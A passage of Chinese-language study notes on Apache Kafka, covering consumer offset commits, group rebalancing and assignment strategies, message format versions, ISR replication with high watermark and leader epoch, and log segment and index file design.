不同的消息，但显然我们只关心最新一次提交的那条消息。从某种程度来说，只有最新提交的位移值是有效的，其他消息包含的位移值其实都已经过期了。Kafka通过压实（compact）策略来处理这种消息使用模式。\n默认情况下，consumer是自动提交位移的，自动提交间隔是5秒。这就是说若不做特定的设置，consumer程序在后台自动提交位移。通过设置auto.commit.interval.ms参数可以控制自动提交的间隔。\n\n\n\n\n使用方法\n优势\n劣势\n交付语义保证\n使用场景\n\n\n\n自动提交\n默认不用配置或显式设置enable.auto.commit&#x3D;ture\n开发成本低，简单易用\n无法实现精确控制，位移提交失败后不易处理\n可能造成消息丢失，最多实现“最少一次”处理语义\n对消息交付语义无需求，容忍一定的消息丢失\n\n\n手动提交\n设置enable.auto.commit&#x3D;false;手动调用commitSync或commitAsync提交位移\n可精确控制位移提交行为\n额外的开发成本，须自行处理位移提交\n易实现“最少一次”处理语义，依赖外部状态可实现“精确一次”处理语义\n消息处理逻辑重，不允许消息丢失，至少要求“最少一次”处理语义\n\n\n手动提交位移 API 进一步细分为同步手动提交和异步手动提交，即 commitSync 和commitAsync 方法。如果调用的是 commitSync，用户程序会等待位移提交结束才执行下一条语句命令。相反地，若是调用 commitAsync，则是一个异步非阻塞调用。consumer在后续 poll调用时轮询该位移提交的结果。特别注意的是，这里的异步提交位移不是指 consumer 使用单独的线程进行位移提交。实际上 consumer 依然会在用户主线程的 poll 方法中不断轮询这次异步提交的结果。只是该提交发起时此方法是不会阻塞的，因而被称为异步提交。\n重平衡（rebalance）consumer group的rebalance本质上是一组协议，它规定了一个consumer group是如何达成一致来分配订阅 topic的所有分区的。假设某个组下有20个 consumer实例，该组订阅了一个有着100个分区的 topic。正常情况下，Kafka会为每个 consumer平均分配5个分区。这个分配过程就被称为 rebalance。当 consumer成功地执行 rebalance后，组订阅 topic的每个分区只会分配给组内的一个consumer实例。\nrebalance 触发条件组rebalance触发的条件有以下3个。\n\n组成员发生变更，比如新 consumer 加入组，或已有 consumer 主动离开组，再或是已有consumer崩溃时则触发rebalance。\n组订阅 topic 数发生变更，比如使用基于正则表达式的订阅，当匹配正则表达式的新topic被创建时则会触发rebalance。\n组订阅 topic 的分区数发生变更，比如使用命令行脚本增加了订阅topic的分区数。\n\n如果一个 group 下的 consumer 处理消息的逻辑过重，并且事件的处理时间波动很大，非常不稳定。会导致 coordinator 会经常性地认为某个 consumer 已经挂掉，引发 rebalance。这时需要仔细调优consumer 参数 request.timeout.ms、max.poll.records 和 max.poll.interval.ms，以避免不必要的rebalance出现。\nrebalance 分区分配在 rebalance时 group下所有的 consumer都会协调在一起共同参与分区分配。Kafka 新版本 consumer 默认提供了3种分配策略，分别是 range 策略、round-robin策略和sticky策略。\nrange策略主要是基于范围的思想。它将单个 topic 的所有分区按照顺序排列，然后把这些分区划分成固定大小的分区段并依次分配给每个 consumer。round-robin策略则会把所有 topic的所有分区顺序摆开，然后轮询式地分配给各个consumer。sticky策略有效地避免了上述两种策略完全无视历史分配方案的缺陷，采用了“有黏性”的策略对所有 consumer 实例进行分配，可以规避极端情况下的数据倾斜并且在两次rebalance间最大限度地维持了之前的分配方案。\n通常意义上认为，如果 group 下所有 consumer 实例的订阅是相同，那么使用 round-robin会带来更公平的分配方案，否则使用range策略的效果更好。新版本 consumer 默认的分配策略是 range。用户根据consumer参数partition.assignment.strategy来进行设置。另外Kafka支持自定义的分配策略，用户可以创建自己的consumer分配器（assignor）。\nrebalance generation某个consumer group可以执行任意次rebalance。为了更好地隔离每次rebalance上的数据，新版本 consumer设计了 rebalance generation用于标识某次 rebalance。generation这个词类似于JVM分代垃圾收集器中“分代”（严格来说，JVM GC使用的是 generational）的概念。在consumer中它是一个整数，通常从0开始。Kafka引入consumer generation主要是为了保护consumer group的，特别是防止无效offset提交。比如上一届的 consumer成员由于某些原因延迟提交了 offset，但 rebalance之后该 group产生了新一届的group成员，而这次延迟的offset提交携带的是旧的generation信息，因此这次提交会被consumer group拒绝。\nrebalance协议rebalance 本质上是一组协议。group 与 coordinator 共同使用这组协议完成group的rebalance。\n\nJoinGroup请求：consumer请求加入组。\nSyncGroup请求：group leader把分配方案同步更新到组内所有成员中。\nHeartbeat请求：consumer定期向coordinator汇报心跳表明自己依然存活。\nLeaveGroup请求：consumer主动通知coordinator该consumer即将离组。\nDescribeGroup 请求：查看组的所有信息，包括成员信息、协议信息、分配方案以及订阅信息等。该请求类型主要供管理员使用。coordinator不使用该请求执行rebalance。\n\nrebalance流程consumer group在执行rebalance之前必须首先确定coordinator所在的broker，并创建与该broker 相互通信的 Socket 连接。确定 coordinator 的算法与确定 offset 被提交到__consumer_offsets目标分区的算法是相同的。算法如下。\n\n计算 Math.abs（groupID.hashCode） % offsets.topic.num.partitions参数值（默认是 50），假设是10。\n寻找__consumer_offsets分区10的leader副本所在的broker，该broker即为这个group的coordinator。成功连接 coordinator之后便可以执行 rebalance操作。目前 rebalance主要分为两步：加入组和同步更新分配方案。\n加入组：这一步中组内所有 consumer（即 group.id 相同的所有 consumer 实例）向coordinator发送 JoinGroup请求。当收集全 JoinGroup请求后，coordinator从中选择一个consumer担任group的leader，并把所有成员信息以及它们的订阅信息发送给leader。特别需要注意的是，group 的 leader 和 coordinator 不是一个概念。leader 是某个consumer 实例，coordinator 通常是 Kafka 集群中的一个 broker。另外 leader 而非coordinator负责为整个group的所有成员制定分配方案。\n同步更新分配方案：这一步中 leader 开始制定分配方案，即根据前面提到的分配策略决定每个consumer都负责哪些topic的哪些分区。一旦分配完成，leader会把这个分配方案封装进 SyncGroup 请求并发送给 coordinator。比较有意思的是，组内所有成员都会发送 SyncGroup请求，不过只有 leader发送的 SyncGroup请求中包含了分配方案。coordinator 接收到分配方案后把属于每个 consumer 的方案单独抽取出来作为SyncGroup请求的response返还给各自的consumer。\n\nconsumer group分配方案是在 consumer端执行的。 Kafka将这个权力下放给客户端主要是因为这样做可以有更好的灵活性。比如在这种机制下用户可以自行实现类似于 Hadoop 那样的机架感知（rack-aware）分配方案。同一个机架上的分区数据被分配给相同机架上的 consumer，减少网络传输的开销。而且，即使以后分区策略发生了变更，也只需要重启 consumer 应用即可，不必重启Kafka服务器。\nrebalance监听器新版本 consumer 默认把位移提交到__consumer_offsets 中。其实，Kafka 也支持用户把位移提交到外部存储中，比如数据库中。若要实现这个功能，用户就必须使用 rebalance监听器。使用 rebalance监听器的前提是用户使用consumer group。如果使用的是独立consumer或是直接手动分配分区，那么rebalance监听器是无效的。\nrebalance 监听器有一个主要的接口回调类 ConsumerRebalanceListener，里面就两个方法onPartitionsRevoked和onPartitionAssigned。在 coordinator 开启新一轮 rebalance 前 onPartitionsRevoked 方法会被调用，而 rebalance 完成后会调用 onPartitionsAssigned 方法。\n\n鉴于 consumer 通常都要求 rebalance 在很短的时间内完成，千万不要在 rebalance监听器的两个方法中放入执行时间很长的逻辑，特别是一些阻塞方法，如各种阻塞队列的take或poll等。\n\n解序列化解序列化（deserializer）或称反序列化与前面的序列化（serializer）是互逆的操作。Kafka consumer从broker端获取消息的格式是字节数组，consumer需要把它还原回指定的对象类型，而这个对象类型通常都是与序列化对象类型一致的。比如 serializer 把一个字符串序列化成字节数组，consumer使用对应的deserializer把字节数组还原回字符串。\n多线程消费实例KafkaConsumer 是非线程安全的。它和 KafkaProducer 不同，后者是线程安全的。\n实现多线程消费consumer的一种方式是创建多个线程来消费 topic 数据。每个线程都会创建专属于该线程的KafkaConsumer实例。另一种方式是将消息的获取与消息的处理解耦，把后者放入单独的工作者线程中，即所谓的 worker线程中。同时在全局维护一个或若干个 consumer 实例执行消息获取任务。\n\n\n\n\n优点\n缺点\n\n\n\n方法1（每个线程维护专属KafkaConsumer)\n实现简单；速度较快，因为无线程间交互开销：方便位移管理；易于维护分区间的消息消费顺序\nSocket连接开销大；consumer数受限于topic分区数，扩展性差；broker端处理负载高（因为发往broker的请求数多）；rebalance可能性增大\n\n\n方法2（全局consumer+多worker线程）\n消息获取与处理解耦；可独立扩展consumer数和worker数，伸缩性好\n实现负载；难于维护分区内的消息顺序；处理链路变长，导致位移管理困难；worker线程异常可能导致消费数据丢失\n\n\n独立consumergroup自动帮用户执行分区分配和 rebalance。对于需要有多个 consumer 共同读取某个 topic 的需求来说，使用group 是非常方便的。但有的时候用户依然有精确控制消费的需求，比如严格控制某个consumer固定地消费哪些分区。比如：\n\n如果进程自己维护分区的状态，那么它就可以固定消费某些分区而不用担心消费状态丢失的问题。\n如果进程本身已经是高可用且能够自动重启恢复错误（比如使用YARN和Mesos等容器调度框架），那么它就不需要让Kafka来帮它完成错误检测和状态恢复。\n\n以上两种情况中 consumer group 都是无用武之地的，取而代之的是被称为独立 consumer （standalone consumer）的角色。standalone consumer 间彼此独立工作互不干扰。任何一个consumer崩溃都不影响其他standalone consumer的工作。\n第六章 - Kafka设计原理broker端设计架构broker是Apache Kafka最重要的组件，本质上它是一个功能载体（或服务载体），承载了绝大多数的Kafka服务。事实上，大多数的消息队列框架都有broker或与之类似的角色。一个broker 通常是以服务器的形式出现的，对用户而言，broker 的主要功能就是持久化消息以及将消息队列中的消息从发送端传输到消费端。Kafka的broker负责持久化producer端发送的消息，同时还为consumer端提供消息。\n消息设计这里先提及一下 Kafka的消息集合以及消息层次的概念。事实上，无论是哪个版本的 Kafka，它的消息层次都分为两层：消息集合（message set）和消息。\n一个消息集合包含若干个日志项，而每个日志项都封装了实际的消息和一组元数据信息。Kafka 日志文件就是由一系列消息集合日志项构成的。Kafka 不会在消息层面上直接操作，它总是在消息集合上进行写入操作。每个消息集合中的日志项由一条“浅层”消息和日志项头部组成。\n\n浅层消息（shallow message）：如果没有启用消息压缩，那么这条浅层消息就是消息本身；否则，Kafka会将多条消息压缩到一起统一封装进这条浅层消息的 value字段。此时该浅层消息被称为包装消息（或外部消息，即 wrapper消息），而value字段中包含的消息则被称为内部消息，即 inner消息。V0、V1 版本中的日志项只能包含一条浅层消息。\n日志项头部（log entry header）：头部由8字节的位移（offset）字段加上4字节的长度（size）字段构成。注意这里的 offset非consumer端的offset，它是指该消息在 Kafka分区日志中的 offset。同样地，如果是未压缩消息，该 offset就是消息的 offset；否则该字段表示 wrapper消息中最后一条 inner消息的 offset。因此，从 V0、V1 版本消息集合日志项中搜寻该日志项的起始位移（base offset 或 starting offset）是一件非常困难的事情，因为在该过程中Kafka需要深度遍历所有inner消息，这也就意味着broker端需要执行解压缩的操作，可见代价之高。\n\n上面V0、V1版本消息集合在设计上的一些缺陷：\n\n空间利用率不高：不论key和value长度是多少，它总是使用4字节固定长度来保存这部分信息。例如，这两个版本保存100或是1000都是使用4字节，但其实我们只需要7位就足以保存100这个数字了，也就是说，只用1字节就足够，另外3字节纯属浪费。\n只保存最新消息位移：如前所述，若启用压缩，这个版本中的 offset 是消息集合中最后一条消息的offset。如果用户想要获取第1条消息的位移，必须要把所有的消息全部解压缩装入内存，然后反向遍历才能获取，显然这个代价是很大的。\n冗余的消息级 CRC校验：为每条消息都执行 CRC 校验有些“鸡肋”。即使在网络传输过程中没有出现恶意篡改，我们也不能想当然地认为在 producer 端发送的消息到consumer 端时其 CRC 值是不变的。若用户指定时间戳类型是 LOG_APPEND_TIME，broker 将使用当前时间戳覆盖掉消息已有时间戳，那么当 broker 端对消息进行时间戳更新后，CRC 就需要重新计算从而发生变化；再如，broker 端进行消息格式转换（broker 端和 clients 端要求版本不一致时会发生消息格式转换，不过这对用户而言是完全透明的）也会带来 CRC值的变化。所以对每条消息都执行 CRC 校验实际上没有必要，不仅浪费空间，还占用了宝贵的CPU时间片。\n未保存消息长度：每次需要单条消息的总字节数信息时都需要计算得出，没有使用单独字段来保存。每次计算时为了避免对现有数据结构的破坏，都需要大量的对象副本，解序列化效率很低。\n\nV2版本依然分为消息和消息集合两个维度，只不过消息集合的提法被消息批次所取代。下面是V2版本消息的格式：\n\n“可变长度”表示 Kafka会根据具体的值来确定到底需要几字节保存。为了在序列化时降低使用的字节数，V2版本借鉴了Google ProtoBuffer中的Zig-zag编码方式，使得绝对值较小的整数占用比较少的字节。Zig-zag编码方式主要的思想就是将一个有符号32位整数编码成一个无符号整数，同时各个数字围绕0依次编码。\n\n\n\n编码前\n编码后\n\n\n\n0\n0\n\n\n-1\n1\n\n\n1\n2\n\n\n-2\n3\n\n\n2\n4\n\n\n…\n…\n\n\n这种编码方式可使用较少的字节来保存绝对值很小的负数。而不用保存32位整数的补码，浪费很多位的空间。\n由于可能使用多字节来编码一个数字，Zig-zag 会固定地将每个字节的第1位留作特殊用途，来表明该字节是否是某个数编码的最后一个字节。即最高位若是1，则表明编码尚未结束，还需要读取后面的字节来获取完整编码；若是0，则表示下一个字节是新的编码。鉴于这个原因，Zig-zag 中每个字节只有7位可用于实际的编码任务，因此单个字节只能编码0～127之间的无符号整数。\nV2版本的消息格式变化：\n\n增加消息总长度字段：在消息格式的头部增加该字段，一次性计算出消息总字节数后保存在该字段中，而不需要像之前版本一样每次重新计算。Kafka 操作消息时可直接获取总字节数，直接创建出等大小的 ByteBuffer，然后分别装填其他字段，简化了消息处理过程。总字节数的引入还实现了消息遍历时的快速跳跃和过滤，省去了很多空间拷贝的开销。\n保存时间戳增量（timestamp delta）：不再需要使用8字节来保存时间戳信息，而是使用一个可变长度保存与 batch 起始时间戳的差值。差值通常都是很小的，故需要的字节数也是很少的，从而节省了空间。\n保存位移增量（offset delta）：与时间戳增量类似，保存消息位移与外层 batch 起始位移的差值，而不再固定保存8字节的位移值，进一步节省消息总字节数。\n增加消息头部（message headers）：V2 版本中每条消息都必须有一个头部数组，里面的每个头部信息只包含两个字段：头部 key和头部 value，类型分别是 String和 byte[]。增加头部信息主要是为了满足用户的一些定制化需求，比如，做集群间的消息路由之用或承载消息的一些特定元数据信息。\n去除消息级 CRC 校验：V2 版本不再为每条消息计算 CRC32 值，而是对整个消息batch进行CRC校验。\n废弃attribute字段：V0、V1版本格式都有一个attribute字段，V2版本的消息正式废弃了这个字段。原先保存在 attribute字段中的压缩类型、时间戳等信息都统一保存在外层的batch格式字段中，但V2版本依然保留了单字节的attribute字段留作以后扩展使用。\n\nV2版本的消息batch格式：\n\n\nCRC值从消息层面被移除，被放入batch这一层。\nbatch层面上增加了一个双字节 attribute字段，同时废弃了消息级别的 attribute字段。在这个双字节的 attribute字段中，最低的 3位依然保存压缩类型，第 4位依然保存时间戳类型，而第5、6位分别保存0.11.0.0版本新引入的事务类型和控制类型。\nPID、producer epoch和序列号等信息都是0.11.0.0版本为了实现幂等性 producer和支持事务而引入的。PID表示一个幂等性producer的ID值，producer epoch表示某个PID携带的当前版本号。broker使用 PID和 epoch来确定当前合法的 producer实例，并以此阻止过期 producer向 broker生产消息。序列号的引入主要是为了实现消息生产的幂等性。Kafka依靠它来辨别消息是否已成功提交，从而防止出现重复生产消息。\n\n集群管理Kafka 是分布式的消息引擎集群环境，它支持自动化的服务发现与成员管理。Kafka 是依赖 Apache ZooKeeper 实现的。每当一个broker启动时，它会将自己注册到ZooKeeper下的一个节点。\nKafka 4.0 彻底移除了 Zookeeper，默认允许在 KRaft 模式下，大大简化了集群的部署和管理，消除了集成 ZooKeeper 的复杂性。这部分略。\n副本与ISR设计个 Kafka分区本质上就是一个备份日志，即利用多份相同的备份共同提供冗余机制来保持系统高可用性。这些备份在 Kafka 中被称为副本（replica）。Kafka 把分区的所有副本均匀地分配到所有broker上，并从这些副本中挑选一个作为leader副本对外提供服务，而其他副本被称为 follower副本，只能被动地向 leader副本请求数据，从而保持与 leader副本的同步。\n假如 leader 副本永远工作正常，那么其实不需要 follower 副本。但现实总是残酷的，Kafka leader 副本所在的 broker 可能因为各种各样的原因而随时宕机。一旦发生这种情况，follower副本会竞相争夺成为新leader的权力。显然不是所有的follower都有资格去竞选leader。follower 会被动地向 leader 请求数据。但对于那些落后 leader 进度太多的 follower 而言，它们是没有资格竞选 leader 的，毕竟它们手中握有的数据太旧了，如果允许它们成为 leader，会造成数据丢失，而这对 clients 而言是灾难性的。鉴于这个原因，Kafka引入了ISR的概念。\n所谓 ISR，就是 Kafka集群动态维护的一组同步副本集合（in-sync replicas）。每个 topic分区都有自己的ISR列表，ISR中的所有副本都与leader保持同步状态。值得注意的是，leader副本总是包含在ISR中的，只有ISR中的副本才有资格被选举为leader。而producer写入的一条 Kafka 消息只有被 ISR 中的所有副本都接收到，才被视为 “已提交”状态。由此可见，若ISR中有N个副本，那么该分区最多可以忍受N-1个副本崩溃而不丢失已提交消息。\nfollower副本同步follower副本只做一件事情：向 leader副本请求数据。\n\n\n起始位移（base offset）：表示该副本当前所含第一条消息的offset。\n高水印值（high watermark,HW）：副本高水印值。它保存了该副本最新一条已提交消息的位移。leader 分区的 HW 值决定了副本中已提交消息的范围，也确定了consumer能够获取的消息上限，超过 HW值的所有消息都被视为“未提交成功的”，因而consumer是看不到的。另外值得注意的是，不是只有leader副本才有HW值。实际上每个 follower副本都有 HW值，只不过只有leader副本的 HW值才能决定 clients能看到的消息数量罢了。\n日志末端位移（log end offset,LEO）：副本日志中下一条待写入消息的 offset。所有副本都需要维护自己的LEO信息。每当leader副本接收到producer端推送的消息，它会更新自己的LEO（通常是加1）。同样，follower副本向leader副本请求到数据后也会增加自己的 LEO。事实上只有 ISR中的所有副本都更新了对应的 LEO之后，leader副本才会向右移动HW值表明消息写入成功。\n\n假设当前Kafka集群当前只有一个topic，该topic只有一个分区，分区共有3个副本，因此ISR中也是这3个副本。该topic当前没有任何数据。由于没有任何数据，因此3个副本的LEO都是0,HW值是0。现有一个producer向broker1所在的leader副本发送了一条消息，接下来会发生什么呢？\n\nbroker1上的leader副本接收到消息，把自己的LEO值更新为1。\nbroker2和broker3上的follower副本各自发送请求给broker1。\nbroker1分别把该消息推送给follower副本。\nfollower副本接收到消息后各自更新自己的LEO为1。\nleader副本接收到其他 follower副本的数据请求响应（response）之后，更新 HW值为1。此时位移为0的这条消息可以被consumer消费。\n\n对于设置了 acks&#x3D;-1 的 producer而言，只有完整地做完上面所有的5步操作，producer才能正常返回，这也标志着这条消息发送成功。\nISR设计0.9.0.0版本之前，Kafka提供了一个参数replica.lag.max.messages，用于控制follower副本落后 leader副本的消息数。一旦超过这个消息数，则视为该 follower为“不同步”状态，从而需要被Kafka“踢出”ISR。\n但在消息不稳定时，比如 出现 producer 的瞬时高峰流量、网络IO导致 follower 请求消息速度变慢、进程卡住等情况，会导致 follower 不断地被踢出 ISR，然后重新加回 ISR，造成了与 leader不同步、再同步、又不同步、再次同步的情况发生。\n所以在0.9.0.0版本之后，Kafka去掉了之前的 replica.lag.max.messages参数，改用统一的参数同时检测由于慢以及进程卡壳而导致的滞后（lagging）——即 follower副本落后 leader副本的时间间隔。这个唯一的参数就是 replica.lag.time.max.ms，默认值是 10 秒。对于“请求速度追不上”的情况，检测机制也发生了变化——如果一个 follower副本落后 leader的时间持续性地超过了这个参数值，那么该 follower 副本就是“不同步”的。这样即使出现producer瞬时峰值流量，只要 follower 不是持续性落后，它就不会反复地在 ISR 中移进、移出。\n水印（watermark）和leader epoch水印也被称为高水印或高水位，通常被用在流式处理领域（著名的框架如Apache Storm、Apache Flink和Apache Spark等），以表征元素或事件在基于时间层面上的进度。一个比较经典的表述为：流式系统保证在水印t时刻，创建时间（event time） &#x3D; t＇且t＇ ≤ t的所有事件都已经到达或被观测到。在 Kafka中，水印的概念反而与时间无关，而与位置信息相关。严格来说，它表示的就是位置信息，即位移（offset）。\n一个 Kafka 分区下通常存在多个副本（replica）用于实现数据冗余，进一步实现高可用性。如前所述，副本根据角色不同分为如下3类。\n\nleader副本：响应clients端读&#x2F;写请求的副本。\nfollower副本：被动地备份leader副本上的数据，不能响应clients端的读&#x2F;写请求。\nISR副本集合：包含leader副本和所有与leader副本保持同步的follower副本。\n\n每个Kafka副本对象都持有两个重要的属性：日志末端位移（log end offset，下称LEO）和高水印（HW）。注意是所有的副本 ，而不止是leader副本。以下是这两个属性的解释。\n\nLEO：日志末端位移，记录了该副本对象底层日志文件中下一条消息的位移值。举一个例子，若 LEO&#x3D;10，那么表示在该副本日志上已经保存了10条消息，位移范围是[0,9]。另外，Kafka对leader副本和follower副本的LEO更新机制是不同的，后面会详细讨论。\nHW：任何一个副本对象的 HW值一定不大于其 LEO值，而小于或等于 HW 值的所有消息被认为是“已提交的”或“已备份的”（replicated）。Kafka对 leader副本和 follower副本的 HW值更新机制也是不同的，后面内容将会讨论它们的不同。\n\n如果把 LEO和 HW看作两个指针，那么它们定位的机制是不同的：任意时刻，HW指向的是实实在在的消息，而 LEO总是指向下一条待写入消息，也就是说 LEO指向的位置上是没有消息的！\nLEO更新机制首先是Kafka如何更新follower副本的LEO属性。follower副本只是被动地向leader副本请求数据，具体表现为 follower副本不停地向 leader副本所在的 broker发送 FETCH请求，一旦获取消息，便写入自己的日志中进行备份。\nfollower 副本的 LEO 是何时更新的呢？严格来说，Kafka 设计了两套 follower 副本LEO 属性：一套 LEO 值保存在 follower 副本所在 broker 的缓存上；另一套 LEO 值保存在leader副本所在 broker的缓存上，换句话说，leader副本所在机器的缓存上保存了该分区下所有follower副本的LEO属性值（当然也包括它自己的LEO）。\n保存两套值是因为Kafka需要利用前者帮助follower副本自身更新HW值，而同时还需要使用后者来确定leader副本的HW值，即分区HW。\n\nfollower副本端的follower副本LEO何时更新？follower副本端的 follower副本 LEO值就是指该副本对象底层日志的LEO值，也就是说，每当新写入一条消息，其 LEO值就会加 1。在 follower发送 FETCH请求后，leader将数据返回给 follower，此时 follower开始向底层 log写数据，从而自动更新其LEO值。\nleader副本端的follower副本LEO何时更新？leader副本端的follower副本LEO的更新发生在leader处理follower FETCH请求时。一旦leader接收到follower发送的FETCH请求，它首先会从自己的log中读取相应的数据，但是在给follower返回数据之前它先去更新follower的LEO（即上面所说的第二套LEO值）。\n最后是leader副本更新 LEO的机制和时机。和 follower更新 LEO道理相同，leader写log时就会自动更新它自己的LEO值。\n\nHW更新机制follower 更新 HW 发生在其更新LEO之后，一旦follower向log写完数据，它就会尝试更新HW值。具体算法就是比较当前LEO值与FETCH响应中leader的HW值，取两者的小者作为新的HW值。这告诉我们一个事实：如果follower的LEO值超过了leader的HW值，那么follower HW值是不会越过leader HW值的。\n比起follower副本的HW属性，leader副本HW值的更新更重要，因为它直接影响了分区数据对于 consumer的可见性 。\n下面四种情况会尝试更新分区 HW值：\n\n副本成为leader副本时：当某个副本成为分区的leader副本，Kafka会尝试更新分区HW。这是显而易见的道理，毕竟分区leader发生了变更，这个副本的状态是一定要检查的。\nbroker 出现崩溃导致副本被踢出 ISR 时：若有 broker崩溃，则必须查看是否会波及此分区，因此检查分区HW值是否需要更新是有必要的。\nproducer 向 leader 副本写入消息时：因为写入消息会更新 leader的 LEO，故有必要再查看HW值是否也需要更新。\nleader 处理follower FETCH 请求时：当leader处理follower的FETCH请求时，首先会从底层的log读取数据，之后再尝试更新分区HW值。\n\n基于水印的备份机制会造成 数据丢失 和 数据不一致&#x2F;数据离散 的风险。因为 HW 值被用于衡量副本备份的成功与否，以及在出现崩溃时作为日志截断的依据，但 HW 值的更新是异步延迟的，特别是需要额外的 FETCH 请求处理流程才能更新，故这中间发生的任何崩溃都可能导致 HW 值的过期。鉴于这些原因，Kafka 0.11.0.0引入了leader epoch来取代HW值。leader端多开辟一段内存区域专门保存leader的epoch信息，这样即使出现上面的两个场景，Kafka也能很好地规避这些问题。\n所谓领导者epoch（leader epoch），实际上是一对值（epoch,offset）。epoch表示leader的版本号，从0开始，当leader变更过1次时，epoch就会加1，而offset则对应于该epoch版本的leader写入第一条消息的位移。假设存在两对值（0,0）和（1,120），那么表示第一个leader从位移0开始写入消息，共写了120条，即[0,119]；而第二个leader版本号是1，从位移120处开始写入消息。\n每个leader broker中会保存这样一个缓存，并定期写入一个检查点文件中。当leader写底层 log 时，它会尝试更新整个缓存——如果这个 leader 首次写消息，则会在缓存中增加一个条目，否则就不做更新。而每次副本重新成为 leader时会查询这部分缓存，获取对应 leader版本的位移，这就不会发生数据不一致和丢失的情况。\n日志存储设计Kafka 日志Kafka日志属于专门为程序访问的日志。而不是常见的松散结构化的请求日志、错误日志或其他数据。从某种意义上说，Kafka 日志的设计更像是关系型数据库中的记录，抑或是某些系统中所谓的提交日志（commit log）或日志（journal）。这些日志有一个共同的特点就是：只能按照时间顺序在日志尾部追加写入记录（record）。\n日志记录按照被写入的顺序保存，读取日志以从左到右的方式进行。每条记录都会被分配一个唯一的且顺序增加的记录号作为定位该消息的唯一标识（位移信息）。记录中消息内容和格式的实现可能有多种方式，比如使用 XML 格式或 JSON 格式。如前所述，Kafka 则是自己定义了消息格式并且在写入日志前序列化成紧凑的二进制字节数组来保存日志。\n日志中记录的排序通常按照时间顺序，即位于日志左边部分的记录的发生时间通常要小于位于右边部分的记录。Kafka 自0.10.0.0版本开始在消息体中增加了时间戳信息。默认情况下，消息创建时间会被封装进消息中，因此，Kafka 记录大部分遵循按时间排序这一规则。当然，凡事皆有例外，Kafka的Java版本producer确实支持用户为消息指定时间戳，用户完全可以打乱这种时间排序。只不过这样的话，时间戳索引文件可能会失效，因此，在实际中似乎并没有太多的使用场景。\nKafka 的日志设计都是以分区为单位的，即每个分区都有它自己的日志，该日志被称为分区日志（partition log）。producer 生产 Kafka 消息时需要确定该消息被发送到的分区，然后Kafka broker把该消息写入该分区对应的日志中。具体对每个日志而言，Kafka又将其进一步细分成日志段文件（log segment file）以及日志段索引文件。所以，每个分区日志都是由若干组日志段文件+索引文件构成的。\n底层文件系统创建 topic时，Kafka为该 topic的每个分区在文件系统中创建了一个对应的子目录，名字就是-&lt;分区号&gt;。所以，倘若有一个 topic 名为 test，有两个分区，那么在文件系统中Kafka会创建两个子目录：test-0和 test-1。每个日志子目录的文件构成都是若干组日志段+索引文件。\n日志段文件，即后缀名是.log 的文件保存着真实的 Kafka 记录。每个.log文件都包含了一段位移范围的Kafka记录。Kafka使用该文件第一条记录对应的offset来命名此.log文件。因此，每个新创建的 topic分区一定有 offset是0的.log文件，即00000000000000000000.log。虽然在 Kafka内部 offset是用64位来保存的，但目前对于日志段文件而言，Kafka只使用20位数字来标识offset。不过对于实际的线上环境而言，这通常是足够的。\nKafka每个日志段文件是有上限大小的，由 broker端参数log.segment.bytes 控制，默认就是1GB 大小。因此，当日志段文件填满记录后，Kafka 会自动创建一组新的日志段文件和索引文件——这个过程被称为日志切分（log rolling）。日志切分后，新的日志文件被创建并开始承担保存记录的角色。\n一旦日志段被填满，它就不能再追加写入新消息了，而 Kafka 正在写入的分区日志段文件被称为当前激活日志段（active log segment）或简称为当前日志段。当前日志段非常特殊，它不受任何 Kafka后台任务的影响，比如定期日志清除任务和定期日志compaction任务。\n索引文件除了.log 文件，Kafka 分区日志还包含两个特殊的文件.index 和.timeindex，它们都是索引文件，分别被称为位移索引文件和时间戳索引文件。前者可以帮助broker更快地定位记录所在的物理文件位置，而后者则是根据给定的时间戳查找对应的位移信息。\n它们都属于稀疏索引文件（sparse index file），每个索引文件都由若干条索引项（index entry）组成。Kafka 不会为每条消息记录都保存对应的索引项，而是待写入若干条记录后才增加一个索引项。broker 端参数 log.index.interval.bytes 设置了这个间隔到底是多大，默认值是4KB，即 Kafka 分区至少写入了 4KB 数据后才会在索引文件中增加一个索引项，故本质上它们是稀疏的。\n不论是位移索引文件还是时间戳索引文件，它们中的索引项都按照某种规律进行升序排列。对于位移索引文件而言，它是按照位移顺序保存的；而时间戳索引文件则严格按照时间戳顺序保存。由于有了这种升序规律，Kafka可以利用二分查找（binary search）算法来搜寻目标索引项，从而降低整体时间复杂度到 O（lgN）。若没有索引文件，Kafka 搜寻记录的方式只能是从每个日志段文件的头部顺序扫描，因此，这种方案的时间复杂度是 O（N）。显然，引入索引文件可以极大地减少查找时间，减少broker端的CPU开销。\n当前，索引文件支持两种打开方式：只读模式和读&#x2F;写模式。对于非当前日志段而言，其对应的索引文件通常以只读方式打开，即只能读取索引文件中的内容而不能修改它。反之，当前日志段的索引文件必须要能被修改，因此总是以读&#x2F;写模式打开的。当日志进行切分时，索引文件也需要进行切分。此时，Kafka 会关闭当前正在写入的索引文件，同时以读&#x2F;写模式创建一个新的索引文件。broker 端参数 log.index.size.max.bytes 设置了索引文件的最大文件大小，默认值是10MB。和日志段文件不同，索引文件的空间默认都是预先分配好的，而当对索引文件切分时，Kafka 会把该文件大小“裁剪”到真实的数据大小。\n位移索引文件和时间戳索引文件的格式。\n\n位移索引文件每个索引项固定地占用8字节的物理空间，同时Kafka强制要求索引文件必须是索引项大小的整数倍，即8的整数倍。因此，假设设置参数log.index.size.max.bytes为300，那么Kafka在内部会“勒令”该文件大小为296——即不大于300的最大的8的倍数。前4位是相对位移——它保存的是与索引文件起始位移的差值。索引文件文件名中的位移就是该索引文件的起始位移。通过保存差值，我们只需要4字节而非保存整个位移的8字节。后4位是文件物理位置。如果想要增加索引项的密度，可以减少broker端参数log.index.interval.bytes的值。\n时间戳索引文件每个索引项固定占用12字节的物理空间，同时 Kafka强制要求索引文件必须是索引项大小的整数倍，即12的整数倍。因此，假设设置参数log.index.size.max.bytes为100，那么Kafka在内部会“勒令”该文件大小为96——即不大于100的最大的12的倍数。时间戳索引项保存的也是相对位移值。前8位是时间戳。后4位是相对位移。时间戳索引项保存的是时间戳与位移的映射关系。给定时间戳之后根据此索引文件只能找到不大于该时间戳的最大位移，稍后 Kafka 还需要拿着返回的位移再去位移索引文件中定位真实的物理文件位置。该索引文件中的时间戳一定是按照升序排列的。若消息R2在日志段中位于R1之前，但R2的时间戳小于R1（这是可能的，因为Java版本producer允许用户手动指定时间戳），那么 R2这条消息是不会被记录在时间戳索引项中的，因为这会造成时间的乱序。目前 Kafka 还无力调整这种时间“错乱”的情况，而缺乏对应的索引项也会使得 clients 